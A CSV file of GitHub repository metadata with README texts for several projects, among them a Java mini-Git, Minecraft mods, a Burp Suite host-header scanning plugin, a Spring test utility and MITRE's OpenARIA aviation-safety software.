repo,branch,readme,releases_count,open_issues_count,branches_count,license
ProgrammerLMS/mini-git,master,"目录

- [mini-git：用Java实现一个简易版Git](#mini-git用java实现一个简易版git)
  - [0. 介绍与说明](#0-介绍与说明)
  - [1. 内部数据结构](#1-内部数据结构)
    - [1.1 blob](#11-blob)
    - [1.2 tree](#12-tree)
    - [1.3 commit](#13-commit)
    - [1.4 stage](#14-stage)
  - [2. 支持的指令](#2-支持的指令)
    - [2.1 init](#21-init)
    - [2.2 add](#22-add)
    - [2.3 commit](#23-commit)
    - [2.4 status](#24-status)
    - [2.5 log](#25-log)
    - [2.6 rm](#26-rm)
    - [2.7 branch](#27-branch)
    - [2.8 checkout](#28-checkout)
  - [3. 额外功能](#3-额外功能)
  - [4. 文件目录](#4-文件目录)
  - [5. 运行截图](#5-运行截图)
# mini-git：用Java实现一个简易版Git

特此鸣谢`UCB`提供的`skeleton code`！

![](image/icon.png)

## 0. 介绍与说明

本玩具项目基于作者对`Git`的理解与`Git`操作，基本实现了`Git`部分指令的底层运行原理。在技术上只使用到了`Java 8 `官方库，包括序列化、文件、集合等，适合对`Git`或`Java`基础不够熟悉的计算机新手进行源码阅读或调试。

本系统已实现的指令在下方，由于代码量小及水平有限，部分命令和`Git`软件的真实使用效果并不相同，并对一些复杂指令作出简化，请阅读下方指令的**注意事项**，避免运行中由于人工误操作出现Bug。

同时，该系统不能完全代表`Git`内部真正的工作流程，**仅仅代表**本人理解与对`Git`实操的认识，借此抛砖引玉。（另外安利一个可视化学习`Git`的网站，[Learn Git Branching](https://learngitbranching.js.org/?locale=zh_CN)

## 1. 内部数据结构

### 1.1 blob

存在于`.git/object`文件夹，`blob`表示保存的文件内容。由于 `Git `会保存多个版本的文件，因此一个文件可能对应多个 `blob`：每个 `blob `在不同的`commit`中被跟踪。

### 1.2 tree

存在于`.git/object`文件夹，`tree`表示文件目录，即将名称映射为 `blob` 和其他子`tree`（子目录）引用的目录结构。在本项目中为了简化，没有包含实际的`tree`对象，而是直接通过文件路径。具体原理可见：[Git基础 — 16、Tree对象详解 - 繁华似锦Fighting - 博客园 ](https://www.cnblogs.com/liuyuelinfighting/p/16194504.html)

### 1.3 commit

存在于`.git/object`文件夹。`commit`包含了日志信息、元数据（提交日期、作者等）、对`tree`对象的引用以及对父`commit`的引用等。同时`Git`还会维护从分支头部到提交引用的映射。

### 1.4 stage

暂存区，对应`.git`中的`index`文件，在本项目中，`stage`包含了**新增文件暂存区**和**删除文件暂存区**。在下文中，我们称之为“**暂存-新增区**”与“**暂存-删除区**”。

## 2. 支持的指令

### 2.1 init

指令

- ##### `git init`

说明

- 该指令会在当前目录下创建一个新的 `mini-git` 版本控制系统。该系统将自动从一个`commit`开始：并且该提交不包含任何文件。初始状态下只有一个默认当前分支：`master`。由于 `mini-git`创建的所有版本库的初始提交内容完全相同，因此所有版本库都会自动共享该`commit`（它们都有相同的 `UID`），所有版本库中的所有`commit`都会追溯到该次提交。

### 2.2 add

指令

- ##### `git add .`

- ##### `git add [file/folder] [file/folder] ...`

说明

- 将当前存在的文件副本添加到暂存区。因此，被添加文件也称为暂存文件。重新暂存已暂存的文件会用新内容覆盖暂存区域中的前一个条目。如果文件的当前工作版本与当前提交的版本相同，则不要将其添加到暂存区；如果文件已经在暂存区，则应将其从暂存区移除（这可能发生在文件被修改、添加，然后又改回原始版本的情况下）。如果该文件在执行`git rm`命令时已在暂存区，则不会再被暂存。
- 具体原理同上。

注意事项

- 其中，`folder`为工作目录下的相对路径，如`git add a/b.txt`，如果你的路径包含空格，请加入**双引号**，如`git add ""a b""`，表示名为`a b`的文件夹。由于本系统无`vim`编辑模式，**请不要只输入一个引号**。

### 2.3 commit

指令

- ##### `git commit -m [message]`

说明

- 该操作会保存当前`commit`和暂存-新增区中跟踪文件的快照，并创建一个新的`commit`,新的`commit`的父`commit`为当前`commit`。在默认情况下，每个`commit`的文件快照与其父`commit`的文件快照完全相同；它将保持文件版本的原样。新`commit`只会更新已经被添加到暂存-新增区的文件，在这种情况下，新`commit`将包含在暂存区的文件版本，而不是从父`commit`中获得的版本。同时，新`commit`将保存并开始跟踪任何父`commit`没有跟踪的文件。最后，在当前`commit`中被跟踪的文件可能会在新`commit`中被取消跟踪，因为这些文件已被 `rm `命令删除。


### 2.4 status

指令

- ##### `git status`

说明

- 表示当前工作目录的状态，包含的内容信息如下：

  ```markdown
  === Staged Files ===
  
    
  === Removed Files ===
  
    
  === Modifications Not Staged For Commit ===
  
    
  === Untracked Files ===
  
  ```

### 2.5 log

指令

- ##### `git log`

- ##### `git log -[number]`

- ##### `git log --grep=[message]`

说明

- 按时间先后，展示所有`commit`记录
- 展示给定数量的`commit`记录
- 展示包含`message`信息的`commit`记录

### 2.6 rm

指令

- ##### `git rm [file/folder] [file/folder] ...`

- ##### `git rm -f [file/folder] [file/folder] ...`

- ##### `git rm -cached [file/folder] [file/folder] ...`

说明

- 从暂存区和工作目录，删除文件或文件夹
- 强制删除
- 只删除暂存区的文件或文件夹，保留工作目录的文件或文件夹

### 2.7 branch

指令

- ##### `git branch`

- ##### `git branch [branch name]`

- ##### `git branch -d [branch name]`

说明

- 查看当前所有本地分支

- 创建分支

- 删除分支

### 2.8 checkout

指令

- ##### `git checkout [branch name]`

- ##### `git checkout -b [branch name]`

- ##### `git checkout -- [file] [file] ...`

- ##### `git checkout [commit id] -- [file] [file] ...`

说明

- 所有文件切换到给定分支
- 创建分支，并切换到该分支
- 使用当前`head commit`的文件版本覆写该文件
- 根据指定commit的文件版本覆写该文件

## 3. 额外功能

- 支持`git [command] -h`查看指令帮助
- 支持八位`commit id`检索，如`d2ee103f`
- 系统会缓存上一次最近打开的工作目录
- 系统会缓存指令，通过键盘上的`↑`与`↓`按键，即可切换指令

## 4. 文件目录

```
├─src
    │  Main.java
    │
    ├─command
    │      AddCommand.java
    │      BranchCommand.java
    │      CheckoutCommand.java
    │      CommitCommand.java
    │      ICommand.java
    │      InitCommand.java
    │      LogCommand.java
    │      MergeCommand.java
    │      ResetCommand.java
    │      RmCommand.java
    │      StatusCommand.java
    │
    ├─engine
    │      Engine.java
    │      Repository.java
    │
    ├─object
    │      Blob.java
    │      Commit.java
    │      Stage.java
    │
    ├─utils
    │      FileTreeUtils.java
    │      PersistanceUtils.java
    │
    └─view
            CommandPromptGUI.java
            ViewResponseEntity.java
            ViewResponseEnum.java
```

## 5. 运行截图

![](image/running.png)

如有疑问，欢迎`emali`至programmerlms@163.com；如有`bug`，那是正常的:)",0,1,1,
wisp-forest/accessories,1.21.x,"<h1 align=""center"">
  <img src=""https://cdn.modrinth.com/data/jtmvUHXj/14fabf4859e845b0bd6659daf2375be3e88f59ec.png"" width=230>
  <br>
  αccessories
  <br>
  <a href=""https://modrinth.com/mod/accessories/"">
      <img src=""https://img.shields.io/badge/-modrinth-gray?style=for-the-badge&labelColor=green&labelWidth=15&logo=appveyor&logoColor=white"">
  </a>
  <a href=""https://www.curseforge.com/minecraft/mc-mods/accessories"">
      <img src=""https://img.shields.io/badge/-curseforge-gray?style=for-the-badge&labelColor=orange&labelWidth=15&logo=appveyor&logoColor=white"">
  </a>
  <br>
  <a href=""https://maven.wispforest.io/#/releases/io/wispforest/accessories-fabric"">
    <img alt=""Maven metadata URL"" src=""https://img.shields.io/maven-metadata/v?metadataUrl=https%3A%2F%2Fmaven.wispforest.io%2Freleases%2Fio%2Fwispforest%2Faccessories-fabric%2Fmaven-metadata.xml&style=for-the-badge"">
  </a>
  <a href=""https://discord.gg/xrwHKktV2d"">
      <img src=""https://img.shields.io/discord/825828008644313089?label=wisp%20forest&logo=discord&logoColor=white&style=for-the-badge"">
  </a>
  <a href=""https://docs.wispforest.io/accessories/home/"">
    <img src=""https://img.shields.io/badge/Documentation-Link-SECRET_MESSAGE?link=https%3A%2F%2Fdocs.wispforest.io%2Faccessories%2Fhome%2F&logo=discord&logoColor=white&style=for-the-badge"">
  </a>
</h1>

## Overview
Accessories is a Data-Driven Accessory mod for NeoForge and Fabric with emphasis on using a Common API for both platforms when possible

<p/>
  
This API is based on the works of [Curios](https://github.com/TheIllusiveC4/Curios) and [Trinkets](https://github.com/emilyploszaj/trinkets) with credit going to both [TheIllusiveC4](https://github.com/TheIllusiveC4) and [emilyploszaj](https://github.com/emilyploszaj) for their work on Accessory mods for Minecraft.

<p align=""center"">
  <img width=600 src=""https://cdn.modrinth.com/data/jtmvUHXj/images/e40c711b48f2962a31f808c34792ba4f71978ca3.png""/>
</p>

## Build Setup

Below is an example of various dependencies setups for platforms with the given repositories are all required for all accessories dependencies.

### Groovy
```groovy
repositories {
    maven { url 'https://maven.wispforest.io/releases' }
    maven { url 'https://maven.su5ed.dev/releases' }
    maven { url 'https://maven.fabricmc.net' }
    maven { url 'https://maven.shedaniel.me/' }
}

// Fabric
dependencies {
    modImplementation(""io.wispforest:accessories-fabric:${project.accessories_version}"")
}
//...

// Arch Common
dependencies {
    modImplementation(""io.wispforest:accessories-common:${project.accessories_version}"")
}
//...

// Arch NeoForge
dependencies {
    modImplementation(""io.wispforest:accessories-neoforge:${project.accessories_version}"")

    // Required due to issues with JIJ dependency resolving in arch or something
    forgeRuntimeLibrary(""io.wispforest:endec:0.1.8"")
    forgeRuntimeLibrary(""io.wispforest.endec:gson:0.1.5"")
    forgeRuntimeLibrary(""io.wispforest.endec:netty:0.1.4"")
}
//...

// NeoForge
dependencies {
    implementation(""io.wispforest:accessories-neoforge:${project.accessories_version}"")
}
//...

// Vanilla Gradle Common
dependencies {
    // Yarn Intermediary 
    compileOnly(""io.wispforest:accessories-common:${project.accessories_version}"")
    
    // Mojang Mappings
    compileOnly(""io.wispforest:accessories-common:${project.accessories_version}-mojmap"")
}
```
<details>
<summary><h3>Kotlin DSL</h3></summary>
  
```kotlin
repositories {
    maven(""https://maven.wispforest.io/releases"")
    maven(""https://maven.su5ed.dev/releases"")
    maven(""https://maven.fabricmc.net"")
    maven(""https://maven.shedaniel.me/"")
}

// Fabric
dependencies {
    modImplementation(""io.wispforest:accessories-fabric:${properties[""accessories_version""]}"")
}
//...

// Arch Common
dependencies {
    modImplementation(""io.wispforest:accessories-common:${properties[""accessories_version""]}"")
}
//...

// Arch NeoForge
dependencies {
    modImplementation(""io.wispforest:accessories-neoforge:${properties[""accessories_version""]}"")

    // Required due to issues with JIJ dependency resolving in arch or something
    forgeRuntimeLibrary(""io.wispforest:endec:0.1.8"")
    forgeRuntimeLibrary(""io.wispforest.endec:gson:0.1.5"")
    forgeRuntimeLibrary(""io.wispforest.endec:netty:0.1.4"")
}
//...

// NeoForge
dependencies {
    implementation(""io.wispforest:accessories-neoforge:${properties[""accessories_version""]}"")
}
//...

// Vanilla Gradle Common
dependencies {
    // Yarn Intermediary 
    compileOnly(""io.wispforest:accessories-common:${properties[""accessories_version""]}"")

    // Mojang Mappings
    compileOnly(""io.wispforest:accessories-common:${properties[""accessories_version""]}-mojmap"")
}
```
</details>

## Features
- Compatibility Layers with existing Accessory Mods like [Curios](https://github.com/TheIllusiveC4/Curios) and [Trinkets](https://github.com/emilyploszaj/trinkets)
- Full Support for NBT-based Accessories (More Info on Wiki {TODO: ADD LINK TO WIKI})
- Existing API Events for Piglin Neutral Items, Enderman Masks, Looting Adjustments, Fortune Adjustments, and Snow Walking Ability.
- Unique Slot API for Mod Specific Accessories (More Info on Wiki {TODO: ADD LINK TO WIKI})
",6,13,4,NOASSERTION
hy0jer/HostScan,main,"## 前言

该BP插件是在工作之余编写出来的，设计初衷是实现对host头攻击的全自动检测，这是作者第一次尝试编写bp插件，可以说是个Demo项目，如果有任何使用问题或者其他好的idea，可提交issues 

## 简介

该插件支持对host头攻击的全自动检测和主动扫描

#注意该BP插件使用MontoyaApi编写，不兼容旧版burp suite

## 安装流程

在burp suite的Extensions选项页面添加HostScan插件

![install](./images/install.png)

正常安装完毕后是如下页面显示

![install1](./images/install1.png)

![install2](./images/show.png)

### 使用说明

该插件支持两种运行方式，手动选择进行扫描以及自动扫描

### 自动扫描

安装后该插件初始状态默认设置自动扫描，即经过burp suite的流量都会进行扫描，如果检测到存在host头攻击会在Target选项页面以及HostScan插件详情页面显示具体情况，如下图所示

![78170bb6529f16e2d29c42e764c5142](./images/78170bb6529f16e2d29c42e764c5142.png)

![a5fff58bf98e935270f22d19e2dce85](./images/a5fff58bf98e935270f22d19e2dce85.png)



如果不想使用自动扫描，可点击该框关闭，如下所示

![operate](./images/operate.png)

![show](./images/install2.png)

### 主动扫描

右键选择需要检测的请求包通过extensions选项进行扫描

![ceaab9b923e2758cb57e885d6d1b500](./images/ceaab9b923e2758cb57e885d6d1b500.png)

如果检测出安全问题，会在详情页面显示

![b2a7c9ad2138e025550f49b9dd0377d](./images/b2a7c9ad2138e025550f49b9dd0377d.png)
",1,1,1,MIT
lhccong/short-link-dog-backend,master,"# ShortLinkDog🐕 - 你的友好短链生成系统

ShortLinkDog是一个简单高效的URL缩短系统，旨在帮助你将长URL缩短为易于分享的简洁链接。使用ShortLinkDog，你可以使URL更加用户友好，并轻松管理你的链接。

## 特性

- 将长URL缩短为简洁、易记的链接。
- 可自定义链接别名，用于品牌和组织。
- 提供详细的链接分析功能，跟踪链接性能。
- 提供易于使用的Web界面和API供集成使用。
- 安全且可扩展的架构。

## 开始使用

### 先决条件

- Java 8或更高版本。
- Redis。
- Spring Boot。
- MySQL或其他兼容的数据库。

### 安装

1. 克隆这个仓库。
2. 在`application.properties`中配置数据库设置。
3. 使用Maven或你喜欢的构建工具构建项目。
4. 运行应用程序。

## 使用方法

- 访问`http://localhost:8101`的Web界面以缩短URL。
- 使用API以编程方式创建和管理短链接。

## API文档

有关API文档和使用示例，请参阅[API文档](api-docs.md)。

## 贡献

我们欢迎社区的贡献。如果你想要贡献，请查看我们的[贡献指南](CONTRIBUTING.md)。

## 许可证

本项目根据MIT许可证授权 - 请参阅[LICENSE](LICENSE)文件以获取详细信息。

## 鸣谢

ShortLinkDog受到对简单而有效的URL缩短的需求启发而创建。我们感谢开源社区的贡献和支持。

愿你使用ShortLinkDog愉快！
",0,0,1,
jithrew/PantryMate,main,"# PantryMate
 
 PantryMate is an application designed for efficient and user-friendly management of household pantries, aimed at reducing food waste and improving organization.

## Tech Stack
- **[Java](https://www.java.com/en/)** - Programming Language
- **[SQLite](https://www.sqlite.org/index.html)** - Database

## Installation
1. Clone the repository:
   ```bash
   git clone https://github.com/jithrew/PantryMate-SE.git
2. Open the cloned folder in Visual Studio Code.
3. Run the application using Java.

 ## Authors
- Fajardo, Walley
- Quiday, Elisha Joash
- Sta. Ana, Jethro
- Suzon, Baron David
",0,0,1,
seregamorph/spring-test-smart-context,master,"## Improving Spring Boot Test efficiency

### Problem statement
Spring test framework creates an application context according to test class configuration.
The context is cached and reused for all subsequent tests. If there is an existing context
with the same configuration, it will be reused. Otherwise, the new context will be created.
This is a very efficient and flexible approach, but it has a drawback: eventually this may
lead to out of memory errors if the number of unique configurations is too high and context
has a lot of heavyweight beans like TestContainers. In many cases simple static bean 
definition can help, but this project suggests another approach: reordering test classes
and eager context cleanup.

Consider a sample test suite of 8 classes that use 4 different configurations, classes that have the same configuration
are marked with the same colour:

<img src=""doc/sample-test-suite.png"" alt=""Sample test suite"" width=""700""/>

In a large test suites as well as in shared CI/CD environments with lots of test pipelines
working simultaneously this may eventually lead to out of memory errors
in Java process or Docker host.

### Proposed solution
It's recommended to use statically-defined TestContainers beans, optimize reusing same configuration between tests 
e.g. via common test super-classes.
But additionally this library makes two optimizations:
* test class execution is reordered to group tests with the same context configuration so they
can be executed sequentially
* the order of tests is known, so if current test class is last per current configuration, the spring context
will be automatically closed (it's called `Smart DirtiesContext`) and the beans will be disposed releasing resources

As a result, in a suite of single module there will always be not more than 1 active spring contexts:

<img src=""doc/reorder-and-smart-dirties-context.png"" alt=""Reordered suite with smart DirtiesContext"" width=""700""/>

This chart is done via calculating the number of active docker containers while executing a suite of 120 integration
test classes that actively uses TestContainers for databases (several datasources simultaneously) and other services:

<img src=""doc/active-docker-containers.png"" alt=""Number of active docker containers"" width=""700""/>

As shown on the chart, the suite just fails with OOM without the optimization.
As an advantage, the total test execution time will also become less, because resource consumption (especially memory)
will be reduced, hence tests are executed faster.

### References
This idea was submitted to the Spring Framework team as a feature request:
* https://github.com/spring-projects/spring-framework/issues/32289

Public presentation with AtomicJar (TestContainers creators):
* https://www.youtube.com/watch?v=_Vci_5nr8R0

### Limitations
At the moment only single thread test execution per module is supported. Parallel test execution is work in progress.
Also there can be problems with Jupiter
[Nested](https://junit.org/junit5/docs/current/user-guide/#writing-tests-nested) test classes.

### Supported versions
`Java` 8+ (`Java` 17+ for spring-boot 3.x projects)

`Spring Boot` 2.4+, 3.x as well as bare Spring framework

Supported test frameworks:
* `JUnit 4` (via JUnit 5 [junit-vintage-engine](https://junit.org/junit5/docs/current/user-guide/#migrating-from-junit4-running))
* `JUnit 5 Jupiter`
* `TestNG` (both bare TestNG and JUnit platform [testng-engine](https://github.com/junit-team/testng-engine))

`Gradle Enterprise Maven Extension` (test execution caching) correctly supports changed behaviour

### How to use
Add maven dependency (available in maven central):
```xml
<dependency>
    <groupId>com.github.seregamorph</groupId>
    <artifactId>spring-test-smart-context</artifactId>
    <version>0.3</version>
    <scope>test</scope>
</dependency>
```
Or Gradle dependency:
```groovy
testImplementation(""com.github.seregamorph:spring-test-smart-context:0.3"")
```
It's recommended to check [Demo projects](demo).

### How it works

<details>
  <summary>JUnit 5 Jupiter</summary>

Add the dependency to the library in test scope, it will automatically setup
[SmartDirtiesClassOrderer](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/jupiter/SmartDirtiesClassOrderer.java)
which will reorder test classes on each execution and prepare the list of last test class per context configuration.
Then this test execution listener
[SmartDirtiesContextTestExecutionListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesContextTestExecutionListener.java)
will be auto-discovered via [spring.factories](spring-test-smart-context/src/main/resources/META-INF/spring.factories).
Alternatively it can be defined explicitly
```java
@TestExecutionListeners(SmartDirtiesContextTestExecutionListener.class)
```
or even inherited from
[AbstractJUnitSpringIntegrationTest](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/jupiter/AbstractJUnitSpringIntegrationTest.java)
</details>

<details>
  <summary>TestNG</summary>

Add the dependency to the library in test scope, it will automatically setup
[SmartDirtiesSuiteListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/testng/SmartDirtiesSuiteListener.java)
which will reorder test classes on each execution and prepare the list of last test class per context configuration.
The integration test classes should add
[SmartDirtiesContextTestExecutionListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesContextTestExecutionListener.java)
```java
@TestExecutionListeners(SmartDirtiesContextTestExecutionListener.class)
```
Note: the annotation is inherited, so it makes sense to annotate the base test class or use
[AbstractTestNGSpringIntegrationTest](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/testng/AbstractTestNGSpringIntegrationTest.java)
parent.
</details>

<details>
  <summary>JUnit 4</summary>

Note: support of JUnit 4 is planned to be removed in version 1.0 (will stay available in 0.x versions).

The JUnit 4 does not provide standard way to reorder test class execution, but it's still possible via
[junit-vintage-engine](https://junit.org/junit5/docs/current/user-guide/#migrating-from-junit4-running).
This dependency should be added to test scope of the module:
```xml
<dependency>
    <groupId>org.junit.vintage</groupId>
    <artifactId>junit-vintage-engine</artifactId>
    <scope>test</scope>
</dependency>
```
or for Gradle (see [detailed instruction](https://docs.gradle.org/current/userguide/java_testing.html#executing_legacy_tests_with_junit_vintage)):
```groovy
testRuntimeOnly('org.junit.vintage:junit-vintage-engine')
testRuntimeOnly('org.junit.platform:junit-platform-launcher')
```
Also the `surefire`/`failsafe` plugins should be configured to use junit-platform:
```xml
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-surefire-plugin</artifactId>
    <version>${maven-surefire.version}</version>
    <dependencies>
        <dependency>
            <groupId>org.apache.maven.surefire</groupId>
            <artifactId>surefire-junit-platform</artifactId>
            <version>${maven-surefire.version}</version>
        </dependency>
    </dependencies>
</plugin>
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-failsafe-plugin</artifactId>
    <version>${maven-surefire.version}</version>
    <dependencies>
        <dependency>
            <groupId>org.apache.maven.surefire</groupId>
            <artifactId>surefire-junit-platform</artifactId>
            <version>${maven-surefire.version}</version>
        </dependency>
    </dependencies>
</plugin>
```
or for Gradle:
```groovy
tasks.named('test', Test) {
    useJUnitPlatform()
}
```

For projects with JUnit 4 it will automatically setup
[SmartDirtiesPostDiscoveryFilter](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesPostDiscoveryFilter.java)
which will reorder test classes on the level of junit-launcher and prepare the list of last test class per context configuration.
Then this test execution listener
[SmartDirtiesContextTestExecutionListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesContextTestExecutionListener.java)
will be auto-discovered via [spring.factories](spring-test-smart-context/src/main/resources/META-INF/spring.factories).
Alternatively it can be defined explicitly
```java
@TestExecutionListeners(SmartDirtiesContextTestExecutionListener.class)
```
or even inherited from
[AbstractJUnit4SpringIntegrationTest](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/junit4/AbstractJUnit4SpringIntegrationTest.java)
</details>

### Additional materials
* See the online presentation of the project https://www.youtube.com/watch?v=_Vci_5nr8R0 hosted by 
[AtomicJar](https://www.atomicjar.com/), the creators of [TestContainers](https://testcontainers.com/) framework.
* Presentation slides: [Miro board](https://miro.com/app/board/uXjVN3KJeCI=/?share_link_id=309027962805)

### Known projects using library
<img src=""doc/miro-logo.png"" alt=""Miro"" width=""120""/>

[Miro](https://miro.com/) is using this approach to optimize huge integration test suites and it saved a lot of resource
for CI/CD pipelines.
",3,0,3,Apache-2.0
LostZX/confluence-exp,master,,1,0,1,
zOnlyKroks/P2P,1.20.4,,0,1,9,MIT
mitre-public/open-aria,main,"
![aria logo picture](./docs/assets/DFW-Airspace-Graph.gif)

[![Java CI with Gradle](https://github.com/mitre-public/open-aria/actions/workflows/gradle.yml/badge.svg)](https://github.com/mitre-public/open-aria/actions/workflows/gradle.yml)
[![License](https://img.shields.io/:license-apache-brightgreen.svg)](http://www.apache.org/licenses/LICENSE-2.0.html)

# Welcome to OpenARIA

This repository contains an open-source edition of the _Aviation Risk Identification and Assessment_ (ARIA) software
program developed by MITRE on behalf of the Federal Aviation Administration's (FAA) Safety and Technical Training (AJI)
Service Unit.

## OpenARIA's Goal

Our goal is to build a community focused on improving aviation safety & efficiency by extracting value from aircraft
location data.

## How OpenARIA can achieve this Goal

1. Provide a publicly available solution for **detecting aviation risks** within aircraft location data.
    - This tangible working solution can be critiqued by the community and improved as necessary.


2. Provide a publicly available solution for detecting **and then aggregating** aviation risks for bulk
   analysis.
    - Someone operating `OpenARIA` for a day will have one day's worth of output
    - Someone operating `OpenARIA` for a year will have a year's worth of output.
    - We must facilitate capturing and utilizing large amounts of output data.


3. Provide a publicly available solution for **archiving and replaying** aircraft location data
    - E.g., when `OpenARIA` detects _an event_, we will want to be able to replay the event to understand what happened.


4. Provide solutions that work with near-real time data streams as well as archival data.

---

# Getting Started

- Learn about important ongoing work [here](./docs/ADRs/supportingNewFormats.md)
  and [here](./docs/ADRs/pointInterfaceCritique2.md)
- Learn about the supported data formats [here](./docs/csv-data-format.md)
    - **Important Caveat:** The initial code commit includes a dependency that is not available in the open source
      domain.
    - We are working to remove this blocker by:
        1. Proposing [this](./docs/csv-data-format.md) data format (which will replace the legacy format)
        2. Adding support for this new data format
        3. Refactoring the code so the closed-source dependency is no longer used or required.
        4. Building the project using **only** GitHub Actions and publicly available dependencies
    - You can view the progress of this work by browsing the branches of the project.
- To begin **detecting aviation events** see [here](./docs/how-to/detect-encounters.md)
- To begin **archiving and replaying** aircraft location data see [here](./docs/how-to/replay-encounters.md)
- To begin detecting **and then aggregating** aviation data see [here](./docs/how-to/aggregate-encounters.md)_

## Building from Source

1. First clone the project: `git clone git@github.com:mitre-public/open-aria.git`
2. Navigate to project directory `cd {PATH_TO_REPOSITORY}/open-aria`
3. Run: `./gradlew shadowJar`
    - This command launches a build plugin that collects all compiled code and dependencies into a single
      jar (aka _uber jar_, _shadow jar_, or _fat jar_)
4. Find the _uber jar_ in: 
    - `{PATH_TO_REPOSITORY}/open-aria/open-aria-deploy/libs/build`
    - The _uber jar_ will have a name like: `open-aria-0.1.0-SNAPSHOT-uber.jar`

## Downloading Pre-Built Artifact
There are 2 places to simply download a pre-built artifact
1. Download a full release from [here](https://github.com/mitre-public/open-aria/releases)
   - **Coming soon** (ETA = June 1st)
2. Download the artifact produced during a recent execution of the CI/CD system.
   - Click [here](https://github.com/mitre-public/open-aria/actions/workflows/gradle.yml) to see the list of recent builds
   - Click on any build from the last 90 days (GitHub stores build artifacts for 90-days)
   - Download the Artifact named: `Deployable-Uber-Jar`

- [ ] TODO: Publish full releases to Maven Central.

---

# Documentation

- [High-level source code summary](docs/codeIntro.md)


- **About ARIA's Airborne Event Data**
    - An example of this JSON output data is [here](open-aria-airborne/src/test/resources/scaryTrackOutput.json)
    - A PDF describing the output data is [here](open-aria-airborne/airborneDataSpec_v3.pdf)


- **Architectural Decision Records (ADRs)**
    - [Supporting New Data Formats](./docs/ADRs/supportingNewFormats.md)
    - [Critique of Point and Track interfaces](docs/ADRs/pointInterfaceCritique.md)
    - [Why YAML configs are preferable to Properties](docs/ADRs/yamlOverProperties.md)
    - [How to compute an event's uniqueId](docs/ADRs/computingUniqueId.md)

---

# Using and Contributing

First of all, **Welcome to the community!**

### Contributing as a User

- **Please submit feedback.**
- Do you have a technical question? If so, please ask. We are here to help. Your question could lead to improvements.
  User questions lead to improved documentation, understanding defects, and eventually code improvements the reach
  everyone in the community.
- Do you have a feature request? If so, please ask. We'll see what we can do given the development time we have
  available.

### Contributing as a Developer

- We will use GitHub's Issue tracking features when the project launches.
- Anyone interested in making technical contributions is welcomed to communicate with the dev team on GitHub. Feel free
  to submit issues, fix issues, and submit PRs.
- We may write a _""contributing guidelines""_ document in the future should the need arise. But for now, our focus will
  be on making high-quality, high-value improvements to the code (not policy documents).

### Contributing as a Data Provider

- OpenARIA is **extremely** interested in collecting shareable aircraft position datasets. Publicly available datasets
  can become the benchmarks dataset by which OpenARIA algorithms are measured and optimized. Read more [here](docs/shared-datasets.md) about
  the fundamental project need.

---

# Near-Term Project RoadMap

![Road Map Figure](docs/assets/OpenARIA-Roadmap.png)

### Version History & Release Notes

See [here](docs/version-release-notes.md)

### MITRE Public Release

- Content approved for public release via The MITRE Corporation's ""Public Release System"" (PRS)
- Reference:  `Public Release Case Number: 23-3623`

### Legal Statement

- **Copyright:** The contents of this project is copyright `The MITRE Corporation`. See details [here](COPYRIGHT.txt) .
- **Open Source License:** This project is released under the Apache License Version 2.0. See details [here](LICENSE).
",1,11,2,Apache-2.0
N1nn1/dye_depot,main,"![logo](https://cdn.modrinth.com/data/cached_images/55730dca078c5f5d993037782ca33c6c534df966.png)

## License

This project's code is licensed under [ARR](LICENSE). You can use it in your Modpack, but if you would like clarification or more explicit permission, either contact me personally on Discord: `ninnih`, or join my [server](https://discord.gg/fT4MKzUTZS).

![Divider](https://cdn.modrinth.com/data/cached_images/1ccd731a59f2b97cc9189ceb9b073d0b61476424.png)
",0,36,2,NOASSERTION
